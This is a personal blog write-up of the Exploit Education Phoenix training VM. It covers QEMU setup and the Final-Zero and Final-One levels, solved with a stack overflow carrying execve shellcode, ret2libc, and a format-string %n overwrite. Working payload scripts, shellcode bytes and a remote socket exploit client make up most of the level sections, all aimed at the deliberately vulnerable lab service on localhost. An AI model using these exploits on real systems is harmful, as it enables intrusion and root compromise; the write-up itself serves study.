---
layout: phoenix
title: "Welcome to Jekyll!"
date: 2025-04-06 12:26:40 +0530
categories: jekyll update
---

---

#  Phoenix:

**Phoenix** is the first part of the binary exploitation learning series by [Exploit Education](https://exploit.education/).

---

##  Getting Started

You can download the Phoenix challenge files from the official page:

 [exploit.education/downloads](https://exploit.education/downloads/)

> ⚠️ At the time of writing, the prebuilt repo wasn’t available.
> So, I built the VM manually using QEMU — and I’ll show you how to do the same!

---

## For Windows Users

### 1. **Download the Image**

* Choose the `amd64` version (or whichever matches your architecture).
* Format: `.qcow2` image inside a `.zip` file.

### 2. **Extract & Navigate**

```bash
unzip phoenix-amd64.zip
cd phoenix-amd64/
```

### 3. **Install QEMU**

QEMU is required to emulate the VM.
For best compatibility, run it through **WSL (Windows Subsystem for Linux)**.

Install QEMU (on WSL):

```bash
sudo apt update && sudo apt install qemu-system-x86
```

---

### 4. **Launch the VM**

Run the following from the extracted image directory:

```bash
qemu-system-x86_64 \
  -m 512M \
  -kernel ./vmlinuz-4.9.0-8-amd64 \
  -initrd ./initrd.img-4.9.0-8-amd64 \
  -hda ./exploit-education-phoenix-amd64.qcow2 \
  -append "root=/dev/sda1 console=ttyS0" \
  -nographic
```

---

## Default Credentials

| Username | `user`   |
| -------- | -------- |
| Passowrd | `user`   |

---

## Accessing the Challenges

Once logged in:

```bash
cd /opt/phoenix/amd64
```

Replace `amd64` with your architecture if you're using a different one.

---

## You're In!

If everything worked, your terminal (via WSL) should show a login prompt and boot into the Phoenix VM. From here, you can start working on the binary exploitation challenges.

> Pro Tip: Use `tmux` or split terminals to keep debugger sessions, source code, and shell access visible at the same time.

---

<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>

---
*“The beginning of the end” — Djo*
---

# Final-Zero

**Challenge**: [Phoenix/Final-Zero](https://exploit.education/phoenix/final-zero/)

**Goal**: Exploit the unsafe use of `gets()` in the network-facing binary to overwrite RIP and execute attacker-controlled code, resulting in successful level completion.

---

## Environment & Intent

From the **Getting Started** notes:

* Qcow2 images ship with:

  * `user / user`
  * `root / root`
* Final levels are **intended to be solved over the network**
* Kernel core pattern:

  ```
  /var/lib/coredumps/core.%e.%s.%p
  ```
* SUID binaries **do not generate core dumps**
* Exploit binaries live in:

  ```
  /opt/phoenix/<architecture>
  ```

This implies:

> Even though exploitation happens over the network, **local debugging is expected** using copies of the binaries and core dumps.

---

## Can We Use Remote GDB?

Attempting to attach GDB remotely:

```gdb
(gdb) target extended-remote 127.0.0.1:64003
```

Results in protocol failure:

```
Ignoring packet error, continuing...
warning: unrecognized item "timeout" in "qSupported"
Remote replied unexpectedly to 'vMustReplyEmpty'
```

### Why This Fails

* GDB speaks the **remote serial protocol**
* The service on `64003` is **not a gdbserver**
* The socket does not implement:

  * `qSupported`
  * breakpoint packets
  * register exchange

**Conclusion**:
This binary does *not* expose a debug stub. Remote GDB is not possible.

---

## Alternative: Crash → Core Dump → Local GDB

Since core dumps are enabled, we can:

1. **Intentionally crash the remote service**
2. Inspect the generated core dump
3. Debug locally using the same binary

Triggering a crash:

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*544 + b'\x40\xea\xff\xff\xff\x7f')" | nc 127.0.0.1 64003
```

Core dump appears in:

```
/var/lib/coredumps/
```

Now debug locally:

```bash
gdb ./final-zero /var/lib/coredumps/core.final-zero.*
```

---

## Vulnerability Analysis

### Source Code

```c
char *get_username() {
  char buffer[512];
  gets(buffer);
  ...
  return strdup(buffer);
}
```

### Observations

* `gets()` → **unbounded input**
* Stack buffer size: **512 bytes**
* No validation
* No stack canaries
* Classic stack-based buffer overflow

This is a **textbook stack smash**.

---

## Exploitation Plan (Classic Stack BOF)

1. Overflow `buffer`
2. Overwrite saved `RIP`
3. Redirect execution into:

   * stack shellcode **or**
   * controlled gadget

NX is **off**, so stack execution is allowed.

---

## Finding Offset to RIP

Using cyclic/padding tests:

```bash
run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*520 + b'B'*24)")
```

Crash shows:

```gdb
Program received signal SIGSEGV
0x4141414141414141 in ?? ()
```

This confirms RIP control.

### Offset Refinement

Testing:

* `544 + RIP` → partial overwrite
* `552 + RIP` → instruction fetch from stack

```bash
run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*552 + b'\x40\xea\xff\xff\xff\x7f')")
```

Result:

```
Program received signal SIGILL
0x00007fffffffea59 in ?? ()
```

**Control flow redirected into stack**

---

## Locating Buffer Address

Inspecting stack:

```gdb
x/200x $rsp-0x20
```

Buffer observed around:

```
0x7fffffffea20
```

We redirect RIP back into this region (NOP sled).

---

## Payload Construction

### Shellcode (execve `/bin/sh`)

```python
shellcode = (
  b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff"
  b"\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e"
  b"\xb0\x3b\x0f\x05"
)
```

### Final Layout

```
[NOP sled]
[shellcode]
[padding]
[return address → stack]
```

### Payload Generator

```python
import struct, sys

address  = struct.pack("<Q", 0x7fffffffea20 + 60)
padding  = b"\x90" * 25
overflow = b"A" * 500

payload = padding + shellcode + overflow + address
sys.stdout.buffer.write(payload)
```

---

## Local Execution

```bash
(python wsx.py; cat) | ./final-zero
```

The `cat` forces stdin to remain open, allowing interactive shell usage.

---

## Remote Exploit

```python
import socket, struct, os, sys, select

s = socket.socket()
s.connect(("127.0.0.1", 64003))
print(s.recv(512))

s.send(payload)

while True:
    r, _, _ = select.select([s, sys.stdin], [], [])
    for fd in r:
        if fd == s:
            os.write(1, s.recv(4096))
        else:
            s.send(os.read(0, 1024))
```

---

## Notes on Stability

If the process exits without a shell:

* Shellcode may lack interactive syscalls
* Use:

  ```bash
  (python wsx.py; cat) | ./final-zero
  ```

---

## Takeaways

* Remote exploitation ≠ remote debugging
* Core dumps bridge the gap

---

## What’s Next

I did ret2libc by execve('/bin/sh', 0, 0)

find the execve by got entry, moreover find /bin/sh string's base address by finding libc.so file and offset by searching the `/bin/sh` in libc files

```python
root@phoenix-amd64:/opt/phoenix/i486# cat /tmp/wsx.py
import struct
import sys
import socket
import telnetlib
from telnetlib import Telnet
import time

port = 64003
ip = "127.0.0.1"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

#payload = b"A"*510 + b"\x00" + b"A"*21
payload = b"A"*528
execve = struct.pack("<I", 0xf7facd6a)
binsh = struct.pack("<I", 0xf7f6d000+0x15d7c8)
null   = struct.pack("<I", 0x0)

argv = struct.pack("<I", 0xffffdd50)
s.send(payload + execve + binsh + b'\x00'*8)
```

```c
root@phoenix-amd64:/opt/phoenix/i486# python /tmp/wsx.py
root@phoenix-amd64:/opt/phoenix/i486# [23881.177136] traps: final-zero[2185] 
general protection ip:4141414141414141 sp:7fffffffec10 error:0
id
uid=0(root) gid=0(root) groups=0(root)
```
---

<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>

---

# Final-One

**Challenge**: [Phoenix/Final-One](https://exploit.education/phoenix/final-one/)

**Goal**: Exploit the unsafe use of `fprintf()` in the network-facing binary to overwrite address and execute attacker-controlled code, resulting in successful level completion.

---

## Environment

While exploring the source code and disassembly, it becomes clear that we need to run the binary with the `--test` argument to debug locally before attempting any remote interaction.

```bash
user@phoenix-amd64:/opt/phoenix/i486$ ./final-one --test
Welcome to phoenix/final-one, brought to you by https://exploit.education
[final1] $ login nastja
invalid protocol
[final1] $ username nastja
[final1] $ login AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Login from testing:12121 as [nastja] with password [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
login failed
[final1] $
```

---

## Binary Analysis

Initially, `strcpy()` looked suspicious and suggested a possible **buffer overflow**. However, after examining the use of `fgets()` and the buffer sizes, a classic overflow appears unlikely.

Below is the relevant portion of the source code:

```c
#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char username[128];
char hostname[64];
FILE *output;

void logit(char *pw) {
  char buf[2048];

  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n",
      hostname, username, pw);

  fprintf(output, buf);
}

void trim(char *str) {
  char *q;

  q = strchr(str, '\r');
  if (q) *q = 0;
  q = strchr(str, '\n');
  if (q) *q = 0;
}

void parser() {
  char line[128];

  printf("[final1] $ ");

  while (fgets(line, sizeof(line) - 1, stdin)) {
    trim(line);
    if (strncmp(line, "username ", 9) == 0) {
      strcpy(username, line + 9);
    } else if (strncmp(line, "login ", 6) == 0) {
      if (username[0] == 0) {
        printf("invalid protocol\n");
      } else {
        logit(line + 6);
        printf("login failed\n");
      }
    }
    printf("[final1] $ ");
  }
}

int testing;

void getipport() {
  socklen_t l;
  struct sockaddr_in sin;

  if (testing) {
    strcpy(hostname, "testing:12121");
    return;
  }

  l = sizeof(struct sockaddr_in);
  if (getpeername(0, (void *)&sin, &l) == -1) {
    err(1, "you don't exist");
  }

  sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
}

int main(int argc, char **argv, char **envp) {
  if (argc >= 2) {
    testing = !strcmp(argv[1], "--test");
    output = stderr;
  } else {
    output = fopen("/dev/null", "w");
    if (!output) {
      err(1, "fopen(/dev/null)");
    }
  }

  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  printf("%s\n", BANNER);

  getipport();
  parser();

  return 0;
}
```

---

## Identifying the Vulnerability

Looking closely at the `logit()` function:

```c
void logit(char *pw) {
  char buf[2048];

  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n",
      hostname, username, pw);

  fprintf(output, buf);
}
```

### Key Issue

The vulnerability lies in this line:

```c
fprintf(output, buf);
```

Here, `buf` is directly used as the **format string** for `fprintf`.

If user input contains **format specifiers** (like `%x`, `%s`, `%n`), `fprintf` will interpret them as formatting instructions rather than plain text.

This creates a **Format String Vulnerability**.

---

## Verifying the Format String Bug

To test this, we run the binary in testing mode:

```bash
./final-one --test
```

Then provide format specifiers as the password:

```bash
[final1] $ username AAAAAAAABBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF
GGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMNNNNNNNNOOOOO
[final1] $ login %x %x %x %x %x %x %x %x %x %x %x %x %x 
%x %x %x %x %x %x %x
```

Output:

```
Login from testing:12121 as [AAAAAAAABBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF
GGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMNNNNNNNNOOOOO] with 
password [0 0 69676f4c 7266206e 74206d6f 69747365 313a676e 31323132 20736120 
4141415b 41414141 42424241 42424242 43434343 43434343 44444444 44444444 
45454545 45454545 46464646]
login failed
```

---

## Exploitation Strategy

One reliable way to exploit this vulnerability is by using **ret2libc**.

For a ret2libc attack we need the following values:

* **Return address** (location we overwrite)
* **`system()` address**
* **Pointer to `/bin/sh`**
* **`exit()` address** (optional but useful to avoid crashes after shell execution)

### Stack Layout

The crafted stack should look like this:

```
system() address
exit() address
/bin/sh pointer
```

When execution returns to this location:

1. `system("/bin/sh")` executes
2. `exit()` runs afterward for stability

---

## Locating Required Addresses

Using **GDB**, we can retrieve the necessary libc symbols.

### `system()` Address

```bash
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7fad824 <system>
```

### `exit()` Address

```bash
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7f7f543 <exit>
```

---

### Locating `/bin/sh` in Memory

Using `find` or direct memory inspection within the mapped `libc` region:

```bash
(gdb) x/s 0xf7ff867a
0xf7ff867a: "/bin/sh"
```

Now we have all required components for the ret2libc chain.

---

## GDB Setup

To stabilize the environment (reduce address variation), I used the following `.gdbscript`:

```bash
/tmp/.gdbscript

unset env LINES
unset env COLUMNS
unset env TERM
unset env _
unset env OLDPWD
unset env SHLVL
set breakpoint pending on
b system
run --test < <(python /tmp/edc.py)
x/12x 0xffffdcbc //orwhatevr the ret address is
```

Run the program in GDB using:

```bash
(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) run
```

This allows easier observation of the stack and confirms whether execution reaches `system()`.

---

## Exploit Payload

The exploit script crafts a payload that:

1. Places **target return addresses** into the username buffer
2. Uses the **format string vulnerability**
3. Writes byte-by-byte using `%n` to overwrite the return address
4. Redirects execution into `system()`

Your payload:

```python
user@phoenix-amd64:/opt/phoenix/i486$ cat /tmp/edc.py
import struct

# 0xf7f7f543 <exit>
#system's address 0xf7fad824

ret = 0xffffdcbc

bomb = "username "
bomb+= b"AAA"
bomb+= struct.pack("I", ret)
bomb+= b"AAAA"   #this is important because our %x needs 
#to read something for spacing to add
bomb+= struct.pack("I", ret+1)
bomb+= b"AAAA"
bomb+= struct.pack("I", ret+2)
bomb+= b"AAAA"
bomb+= struct.pack("I", ret+3)
bomb+= b"AAAA"
bomb+= struct.pack("I", ret+4)
bomb+= b"AAAA"
bomb+= struct.pack("I", ret+5)
bomb+= b"AAAA"
bomb+= struct.pack("I", ret+6)
bomb+= b"AAAA"
bomb+= struct.pack("I", ret+7)
bomb+= b"AAAA"
bomb+= struct.pack("I", ret+8)
bomb+= b"AAAA"
bomb+= struct.pack("I", ret+9)
bomb+= b"AAAA"
bomb+= struct.pack("I", ret+10)
bomb+= b"AAAA"
bomb+= struct.pack("I", ret+11)

bomb+= "\n"

bomb+= "login "
bomb+= "%x %x %x %x %x %x %x %x "
bomb+= "%x"
bomb+= "%85x"
bomb+= "%n"
bomb+= "%180x"
bomb+= "%n"
bomb+= "%34x"
bomb+= "%n"
bomb+= "%253x"
bomb+= "%n"

bomb+= "%76x"
bomb+= "%n"
bomb+= "%178x"
bomb+= "%n"
bomb+= "%258x"
bomb+= "%n"
bomb+= "%256x"
bomb+= "%n"

bomb+= "%131x"
bomb+= "%n"
bomb+= "%12x"
bomb+= "%n"
bomb+= "%121x"
bomb+= "%n"
bomb+= "%248x"
bomb+= "%n"
bomb+= "\n"
print(bomb)
```

---

## Running the Exploit

Execute the payload and pipe it into the vulnerable binary:

```bash
(python /tmp/edc.py; cat) | ./final-one --test
```
Result:

```bash
test@phoenix-amd64:/opt/phoenix/i486$ (python /tmp/edc.py; cat) | ./final-one --t
Welcome to phoenix/final-one, brought to you by https://exploit.education
[final1] $ [final1] $ Login from testing:12121 as [AAA����AAAA����AAAA����AAAA
����AAAA����AAAA����AAAA����AAAA����
AAAA����AAAA����AAAA����AAAA����] with password [0 0 69676f4c 7266206e 
74206d6f 69747365 313a676e 31323132 20736120  4141415b 41414141 41414141 41414141 41414141] 
id
uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
whoami
user
```
<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>
